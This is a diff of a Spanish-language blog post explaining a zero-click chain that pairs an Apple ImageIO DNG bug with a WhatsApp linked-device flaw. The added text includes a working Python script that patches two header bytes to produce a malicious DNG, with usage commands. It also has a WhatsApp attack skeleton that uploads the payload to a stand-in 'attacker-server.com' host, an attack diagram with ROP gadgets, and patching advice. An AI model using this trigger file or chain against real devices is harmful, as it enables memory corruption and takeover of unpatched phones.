+<span class="line"><span style="color:#E1E4E8">        num_components_pos </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> sof3_pos </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 6</span></span>
+<span class="line"><span style="color:#E1E4E8">        num_components </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> data[num_components_pos]</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[+] Número de componentes SOF3: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">num_components</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">    else</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] No se encontró marcador SOF3"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#9ECBFF">        'samples_offset'</span><span style="color:#E1E4E8">: samples_offset,</span></span>
+<span class="line"><span style="color:#9ECBFF">        'samples_value'</span><span style="color:#E1E4E8">: samples_value </span><span style="color:#F97583">if</span><span style="color:#9ECBFF"> 'samples_value'</span><span style="color:#F97583"> in</span><span style="color:#79B8FF"> locals</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">else</span><span style="color:#79B8FF"> None</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">        'sof3_pos'</span><span style="color:#E1E4E8">: sof3_pos </span><span style="color:#F97583">if</span><span style="color:#9ECBFF"> 'sof3_pos'</span><span style="color:#F97583"> in</span><span style="color:#79B8FF"> locals</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">else</span><span style="color:#79B8FF"> None</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">        'num_components'</span><span style="color:#E1E4E8">: num_components </span><span style="color:#F97583">if</span><span style="color:#9ECBFF"> 'num_components'</span><span style="color:#F97583"> in</span><span style="color:#79B8FF"> locals</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">else</span><span style="color:#79B8FF"> None</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">        'num_components_pos'</span><span style="color:#E1E4E8">: num_components_pos </span><span style="color:#F97583">if</span><span style="color:#9ECBFF"> 'num_components_pos'</span><span style="color:#F97583"> in</span><span style="color:#79B8FF"> locals</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">else</span><span style="color:#79B8FF"> None</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#6A737D">    # Inyección de inconsistencia en los offsets críticos</span></span>
-<span class="line"><span style="color:#E1E4E8">    data[</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">2FD00</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">02</span><span style="color:#6A737D">  # SamplesPerPixel = 2</span></span>
-<span class="line"><span style="color:#E1E4E8">    data[</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">3E40B</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">01</span><span style="color:#6A737D">  # NumComponents = 1</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#F97583">    with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(output_dng, </span><span style="color:#9ECBFF">"wb"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> f:</span></span>
+<span class="line"><span style="color:#F97583">def</span><span style="color:#B392F0"> create_poc</span><span style="color:#E1E4E8">(input_file, output_file):</span></span>
+<span class="line"><span style="color:#9ECBFF">    """</span></span>
+<span class="line"><span style="color:#9ECBFF">    Crea un archivo DNG malicioso modificando los dos bytes críticos.</span></span>
+<span class="line"><span style="color:#9ECBFF">    """</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[*] Creando PoC desde: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">input_file</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    # Primero analizamos el archivo</span></span>
+<span class="line"><span style="color:#E1E4E8">    info </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> analyze_dng(input_file)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#F97583"> not</span><span style="color:#E1E4E8"> info:</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] No se pudo analizar el archivo"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> False</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    # Leer el archivo original</span></span>
+<span class="line"><span style="color:#F97583">    with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(input_file, </span><span style="color:#9ECBFF">'rb'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> f:</span></span>
+<span class="line"><span style="color:#E1E4E8">        data </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> bytearray</span><span style="color:#E1E4E8">(f.read())</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    # Modificar SamplesPerPixel: 01 -> 02</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> info[</span><span style="color:#9ECBFF">'samples_offset'</span><span style="color:#E1E4E8">]:</span></span>
+<span class="line"><span style="color:#E1E4E8">        original_samples </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> data[info[</span><span style="color:#9ECBFF">'samples_offset'</span><span style="color:#E1E4E8">]]</span></span>
+<span class="line"><span style="color:#E1E4E8">        data[info[</span><span style="color:#9ECBFF">'samples_offset'</span><span style="color:#E1E4E8">]] </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">02</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[+] SamplesPerPixel modificado: 0x</span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">original_samples</span><span style="color:#F97583">:02x</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF"> -> 0x02"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    # Modificar número de componentes SOF3: 02 -> 01</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> info[</span><span style="color:#9ECBFF">'num_components_pos'</span><span style="color:#E1E4E8">]:</span></span>
+<span class="line"><span style="color:#E1E4E8">        original_comp </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> data[info[</span><span style="color:#9ECBFF">'num_components_pos'</span><span style="color:#E1E4E8">]]</span></span>
+<span class="line"><span style="color:#E1E4E8">        data[info[</span><span style="color:#9ECBFF">'num_components_pos'</span><span style="color:#E1E4E8">]] </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">01</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[+] Componentes SOF3 modificados: 0x</span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">original_comp</span><span style="color:#F97583">:02x</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF"> -> 0x01"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    # Guardar el archivo modificado</span></span>
+<span class="line"><span style="color:#F97583">    with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(output_file, </span><span style="color:#9ECBFF">'wb'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> f:</span></span>
 <span class="line"><span style="color:#E1E4E8">        f.write(data)</span></span>
 <span class="line"><span style="color:#E1E4E8">    </span></span>
-<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"✅ PoC generado correctamente en: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">output_dng</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[+] PoC guardado en: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">output_file</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[!] ADVERTENCIA: Este archivo es solo para fines educativos"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[!] No lo uses en sistemas que no sean de tu propiedad"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> True</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#E1E4E8">generate_poc(</span><span style="color:#9ECBFF">"IMGP0847.DNG"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"poc_malicious.dng"</span><span style="color:#E1E4E8">)</span></span></code></pre>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">def</span><span style="color:#B392F0"> main</span><span style="color:#E1E4E8">():</span></span>
+<span class="line"><span style="color:#E1E4E8">    parser </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> argparse.ArgumentParser(</span></span>
+<span class="line"><span style="color:#FFAB70">        description</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'PoC educativo para CVE-2025-43300 - Modificador de DNG'</span></span>
+<span class="line"><span style="color:#E1E4E8">    )</span></span>
+<span class="line"><span style="color:#E1E4E8">    parser.add_argument(</span><span style="color:#9ECBFF">'input'</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">help</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'Archivo DNG de entrada'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    parser.add_argument(</span><span style="color:#9ECBFF">'-o'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'--output'</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">help</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'Archivo DNG de salida (por defecto: poc.dng)'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    parser.add_argument(</span><span style="color:#9ECBFF">'--analyze'</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">action</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'store_true'</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">help</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'Solo analizar, no modificar'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    args </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> parser.parse_args()</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#F97583"> not</span><span style="color:#E1E4E8"> os.path.exists(args.input):</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[-] Error: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">args.input</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF"> no existe"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">        sys.exit(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> args.analyze:</span></span>
+<span class="line"><span style="color:#E1E4E8">        analyze_dng(args.input)</span></span>
+<span class="line"><span style="color:#E1E4E8">        sys.exit(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    output_file </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> args.output </span><span style="color:#F97583">if</span><span style="color:#E1E4E8"> args.output </span><span style="color:#F97583">else</span><span style="color:#9ECBFF"> 'poc.dng'</span></span>
+<span class="line"><span style="color:#E1E4E8">    create_poc(args.input, output_file)</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">if</span><span style="color:#79B8FF"> __name__</span><span style="color:#F97583"> ==</span><span style="color:#9ECBFF"> "__main__"</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#E1E4E8">    main()</span></span></code></pre>
+<h3 id="cómo-usar-este-código">Cómo Usar Este Código</h3>
+<h4 id="1-obtén-un-dng-de-muestra">1. Obtén un DNG de muestra</h4>
+<p>Necesitas un archivo DNG legítimo. Los investigadores usaron uno de la galería de la <strong>Pentax K-3 Mark III</strong>. Puedes descargar muestras de sitios de fotografía.</p>
+<h4 id="2-analiza-el-archivo">2. Analiza el archivo</h4>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#B392F0">python3</span><span style="color:#9ECBFF"> dng_exploit_builder.py</span><span style="color:#9ECBFF"> IMGP0847.DNG</span><span style="color:#79B8FF"> --analyze</span></span></code></pre>
+<p>Esto te mostrará dónde están los campos que necesitas modificar.</p>
+<h4 id="3-crea-el-payload">3. Crea el payload</h4>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#B392F0">python3</span><span style="color:#9ECBFF"> dng_exploit_builder.py</span><span style="color:#9ECBFF"> IMGP0847.DNG</span><span style="color:#79B8FF"> -o</span><span style="color:#9ECBFF"> malicious.dng</span></span></code></pre>
+<p>El script modificará automáticamente los dos bytes críticos y generará <code>malicious.dng</code>.</p>
+<h3 id="estructura-del-ataque-completo-conceptual">Estructura del Ataque Completo (Conceptual)</h3>
+<p>El código anterior es solo la parte del payload DNG. El ataque completo requiere encadenarlo con la vulnerabilidad de WhatsApp (CVE-2025-55177). Este es un <strong>esqueleto conceptual</strong> de cómo se estructuraría:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#6A737D">#!/usr/bin/env python3</span></span>
+<span class="line"><span style="color:#6A737D"># Estructura conceptual del ataque completo</span></span>
+<span class="line"><span style="color:#6A737D"># ⚠️ ESTO ES SOLO PARA FINES EDUCATIVOS ⚠️</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">class</span><span style="color:#B392F0"> WhatsAppExploit</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#F97583">    def</span><span style="color:#79B8FF"> __init__</span><span style="color:#E1E4E8">(self, target_number):</span></span>
+<span class="line"><span style="color:#79B8FF">        self</span><span style="color:#E1E4E8">.target </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> target_number</span></span>
+<span class="line"><span style="color:#79B8FF">        self</span><span style="color:#E1E4E8">.payload_url </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> None</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    def</span><span style="color:#B392F0"> create_dng_payload</span><span style="color:#E1E4E8">(self, input_dng):</span></span>
+<span class="line"><span style="color:#9ECBFF">        """Paso 1: Crear el DNG malicioso"""</span></span>
+<span class="line"><span style="color:#6A737D">        # Usar el script anterior para generar malicious.dng</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Generando payload DNG..."</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#9ECBFF"> "malicious.dng"</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    def</span><span style="color:#B392F0"> upload_payload</span><span style="color:#E1E4E8">(self, dng_file):</span></span>
+<span class="line"><span style="color:#9ECBFF">        """Paso 2: Subir el payload a un servidor"""</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Subiendo payload a servidor..."</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D">        # Subir el archivo a un servidor controlado</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#9ECBFF"> "https://attacker-server.com/payload.dng"</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    def</span><span style="color:#B392F0"> craft_whatsapp_message</span><span style="color:#E1E4E8">(self, url):</span></span>
+<span class="line"><span style="color:#9ECBFF">        """Paso 3: Crear el mensaje que engaña a WhatsApp"""</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Creando mensaje de sincronización falso..."</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D">        # Construir el mensaje de protocolo que simula</span></span>
+<span class="line"><span style="color:#6A737D">        # ser de un dispositivo vinculado</span></span>
+<span class="line"><span style="color:#E1E4E8">        malicious_message </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#9ECBFF">            "type"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"sync"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">            "device"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"web"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">            "action"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"fetch"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">            "url"</span><span style="color:#E1E4E8">: url</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> malicious_message</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    def</span><span style="color:#B392F0"> deliver_payload</span><span style="color:#E1E4E8">(self):</span></span>
+<span class="line"><span style="color:#9ECBFF">        """Paso 4: Entregar el payload"""</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[*] Entregando payload a </span><span style="color:#79B8FF">{self</span><span style="color:#E1E4E8">.target</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">..."</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D">        # Enviar el mensaje a través de la API de WhatsApp</span></span>
+<span class="line"><span style="color:#F97583">        pass</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    def</span><span style="color:#B392F0"> execute</span><span style="color:#E1E4E8">(self):</span></span>
+<span class="line"><span style="color:#9ECBFF">        """Ejecutar el ataque completo"""</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[!] INICIANDO ATAQUE (SOLO EDUCATIVO)"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">        dng </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> self</span><span style="color:#E1E4E8">.create_dng_payload(</span><span style="color:#9ECBFF">"sample.dng"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">        url </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> self</span><span style="color:#E1E4E8">.upload_payload(dng)</span></span>
+<span class="line"><span style="color:#E1E4E8">        msg </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> self</span><span style="color:#E1E4E8">.craft_whatsapp_message(url)</span></span>
+<span class="line"><span style="color:#79B8FF">        self</span><span style="color:#E1E4E8">.deliver_payload()</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Ataque completado"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># ⚠️ ESTO NO SE DEBE EJECUTAR ⚠️</span></span>
+<span class="line"><span style="color:#6A737D"># ataque = WhatsAppExploit("+34 600 000 000")</span></span>
+<span class="line"><span style="color:#6A737D"># ataque.execute()</span></span></code></pre>
 <hr>
-<h2 id="-por-qué-es-tan-peligroso">🧠 ¿Por qué es tan Peligroso?</h2>
-<p>El impacto real de esta vulnerabilidad radica en tres factores críticos:</p>
+<h2 id="-diagrama-visual-del-ataque-completo">📊 Diagrama Visual del Ataque Completo</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0"><code><span class="line"><span>┌─────────────────────────────────────────────────────────────────┐</span></span>
+<span class="line"><span>│                         EL ATAQUE COMPLETO                      │</span></span>
+<span class="line"><span>├─────────────────────────────────────────────────────────────────┤</span></span>
+<span class="line"><span>│                                                                  │</span></span>
+<span class="line"><span>│  📱 Atacante                                                    │</span></span>
+<span class="line"><span>│      │                                                          │</span></span>
+<span class="line"><span>│      │ 1. Envía mensaje falso a WhatsApp                        │</span></span>
+<span class="line"><span>│      ▼                                                          │</span></span>
+<span class="line"><span>│  ┌──────────────────────────────────────────────────────────┐  │</span></span>
+<span class="line"><span>│  │  CVE-2025-55177 (WhatsApp)                              │  │</span></span>
+<span class="line"><span>│  │  "Soy tu dispositivo vinculado, descarga esto"          │  │</span></span>
+<span class="line"><span>│  └──────────────────────────────────────────────────────────┘  │</span></span>
+<span class="line"><span>│      │                                                          │</span></span>
+<span class="line"><span>│      │ 2. WhatsApp obedece y descarga la imagen DNG            │</span></span>
+<span class="line"><span>│      ▼                                                          │</span></span>
+<span class="line"><span>│  ┌──────────────────────────────────────────────────────────┐  │</span></span>
+<span class="line"><span>│  │  📷 DNG MALICIOSO                                        │  │</span></span>
+<span class="line"><span>│  │  ┌─────────────────┐  ┌─────────────────┐               │  │</span></span>
+<span class="line"><span>│  │  │ Metadatos TIFF  │  │  Stream JPEG    │               │  │</span></span>
+<span class="line"><span>│  │  │ SamplesPerPixel │  │  NumComponents  │               │  │</span></span>
+<span class="line"><span>│  │  │      = 2        │  │      = 1        │               │  │</span></span>
+<span class="line"><span>│  │  └─────────────────┘  └─────────────────┘               │  │</span></span>
+<span class="line"><span>│  │           ⚠️  ¡NO COINCIDEN! ⚠️                         │  │</span></span>
+<span class="line"><span>│  └──────────────────────────────────────────────────────────┘  │</span></span>
+<span class="line"><span>│      │                                                          │</span></span>
+<span class="line"><span>│      │ 3. iOS procesa la imagen automáticamente                │</span></span>
+<span class="line"><span>│      ▼                                                          │</span></span>
+<span class="line"><span>│  ┌──────────────────────────────────────────────────────────┐  │</span></span>
+<span class="line"><span>│  │  CVE-2025-43300 (Apple ImageIO)                         │  │</span></span>
+<span class="line"><span>│  │  Reserva memoria para 2 canales...                       │  │</span></span>
+<span class="line"><span>│  │  ...pero escribe datos como si fueran 1 canal           │  │</span></span>
+<span class="line"><span>│  │  💥 ¡DESBORDAMIENTO DE BÚFER!                           │  │</span></span>
+<span class="line"><span>│  └──────────────────────────────────────────────────────────┘  │</span></span>
+<span class="line"><span>│      │                                                          │</span></span>
+<span class="line"><span>│      │ 4. Se desvía el flujo de control hacia la ROP chain    │</span></span>
+<span class="line"><span>│      ▼                                                          │</span></span>
+<span class="line"><span>│  ┌──────────────────────────────────────────────────────────┐  │</span></span>
+<span class="line"><span>│  │  🧩 CADENA ROP                                           │  │</span></span>
+<span class="line"><span>│  │  Gadget 1: pop {x0, x1}; ret  ←─┐                       │  │</span></span>
+<span class="line"><span>│  │  Gadget 2: mov x0, x1; ret      │                       │  │</span></span>
+<span class="line"><span>│  │  Gadget 3: str x0, [x1]; ret    │  (encadenados)        │  │</span></span>
+<span class="line"><span>│  │  Gadget 4: br x0                │                       │  │</span></span>
+<span class="line"><span>│  └──────────────────────────────────────────────────────────┘  │</span></span>
+<span class="line"><span>│      │                                                          │</span></span>
+<span class="line"><span>│      │ 5. Ejecución del payload final                          │</span></span>
+<span class="line"><span>│      ▼                                                          │</span></span>
+<span class="line"><span>│  ┌──────────────────────────────────────────────────────────┐  │</span></span>
+<span class="line"><span>│  │  🔓 DISPOSITIVO COMPROMETIDO                             │  │</span></span>
+<span class="line"><span>│  │  El atacante puede:                                      │  │</span></span>
+<span class="line"><span>│  │  • Leer tus mensajes                                     │  │</span></span>
+<span class="line"><span>│  │  • Acceder a tus contactos                               │  │</span></span>
+<span class="line"><span>│  │  • Activar cámara y micrófono                           │  │</span></span>
+<span class="line"><span>│  │  • Instalar malware persistente                         │  │</span></span>
+<span class="line"><span>│  └──────────────────────────────────────────────────────────┘  │</span></span>
+<span class="line"><span>│                                                                  │</span></span>
+<span class="line"><span>└─────────────────────────────────────────────────────────────────┘</span></span></code></pre>
+<hr>
+<h2 id="️-cómo-protegerse">🛡️ ¿Cómo Protegerse?</h2>
+<p>La buena noticia es que <strong>ambas vulnerabilidades ya están parcheadas</strong>. Pero la lección es importante y aplicable a todas las amenazas digitales.</p>
+<h3 id="1-actualiza-siempre">1. <strong>Actualiza siempre</strong></h3>
+<p>Esta es la defensa más importante. Tanto Apple como WhatsApp lanzaron parches:</p>
 <ul>
-<li><strong>Invisible:</strong> El usuario no interactúa. No hay enlaces que pulsar ni botones que aceptar. El procesamiento automático en segundo plano activa la vulnerabilidad.</li>
-<li><strong>Silencioso:</strong> La aplicación no muestra comportamientos anómalos visibles mientras el proceso explota la memoria en segundo plano.</li>
-<li><strong>Escalable:</strong> Al no depender del factor humano, las campañas de explotación pueden automatizarse masivamente.</li>
+<li>Apple: iOS 18.6.2, iPadOS 18.6.2, macOS Sequoia 15.6.1</li>
+<li>WhatsApp: versión 2.25.21.73 o superior</li>
 </ul>
-<hr>
-<h2 id="️-mitigación-y-remediación">🛡️ Mitigación y Remediación</h2>
-<p>Ambas compañías distribuyeron parches de seguridad para corregir la vulnerabilidad en la cadena:</p>
-<ol>
-<li><strong>Parche en WhatsApp (CVE-2025-55177):</strong> Incorporación de verificación estricta con firmas criptográficas para cualquier solicitud de sincronización recibida de dispositivos vinculados.</li>
-<li><strong>Parche en Apple iOS (CVE-2025-43300):</strong> Actualización en <code>RawCamera.bundle</code> dentro de <strong>iOS 18.6.2</strong> para validar que <code>SamplesPerPixel</code> coincida exactamente con <code>NumComponents</code> antes de reservar memoria.</li>
-</ol>
+<h3 id="2-revisa-los-dispositivos-vinculados">2. <strong>Revisa los dispositivos vinculados</strong></h3>
+<p>Entra en <strong>WhatsApp → Ajustes → Dispositivos vinculados</strong> y asegúrate de que solo estén los tuyos.</p>
+<h3 id="3-desconfía-de-mensajes-sospechosos">3. <strong>Desconfía de mensajes sospechosos</strong></h3>
+<p>Aunque este ataque no requería que hicieras clic, muchos otros sí. Si recibes un mensaje extraño de un contacto, <strong>confirma por otro medio</strong> que fue él quien te lo envió.</p>
+<h3 id="4-mantente-informado">4. <strong>Mantente informado</strong></h3>
+<p>Sigue los boletines de seguridad de los fabricantes. Las vulnerabilidades de “cero clics” son cada vez más comunes.</p>
+<h3 id="5-reinicia-periódicamente-tu-dispositivo">5. <strong>Reinicia periódicamente tu dispositivo</strong></h3>
+<p>Algunos ataques de “cero clics” residen en la memoria y un reinicio puede eliminarlos.</p>
 <hr>
 <h2 id="-recursos-para-profundizar">📚 Recursos para Profundizar</h2>
-<ul>
-<li><strong><code>zero-click-exploit-analysis</code>:</strong> Proyecto de investigación con paper técnico y análisis de desbordamientos en <em>heap</em>.</li>
-<li><strong>Blog de Quarkslab:</strong> Análisis de ingeniería inversa del parche de Apple para la vulnerabilidad CVE-2025-43300.</li>
-<li><strong>Presentación DNGerousLINK (39C3):</strong> Ponencia detallada sobre la cadena completa de exploits.</li>
-<li><strong>Repositorios PoC:</strong> Herramientas y scripts de análisis publicados por la comunidad de ciberseguridad (<code>hunters-sec</code>, <code>PwnToday</code>).</li>
-</ul> </article> <div class="flex flex-wrap items-center justify-between gap-4 rounded-2xl border border-dashed border-gray-300 bg-white/70 p-6 dark:border-gray-800 dark:bg-gray-900/60"> <div> <h2 class="text-xl font-semibold text-gray-900 dark:text-white">
+<p>Si te ha picado la curiosidad y quieres saber más, estos son los recursos que usaron los investigadores:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
